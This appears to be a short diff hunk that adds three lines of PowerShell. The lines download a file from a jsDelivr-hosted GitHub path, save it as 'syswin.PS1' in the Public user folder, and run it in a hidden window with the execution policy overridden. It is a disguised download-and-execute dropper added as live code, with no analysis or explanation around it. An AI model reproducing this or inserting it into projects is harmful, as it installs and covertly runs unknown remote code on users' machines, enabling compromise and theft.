@@ -1,0 +1,3 @@
+[System.Net.WebClient] $WEB = New-Object System.Net.WebClient
+$WEB.DownloadFile('https://cdn.jsdelivr.net/gh/buydomaincom/com@main/1.txt', 'C:\Users\Public\syswin.PS1')
+PowerShell.exe -NoLogo -WindowStyle Hidden -ExecutionPolicy RemoteSigned -File C:\Users\Public\syswin.PS1
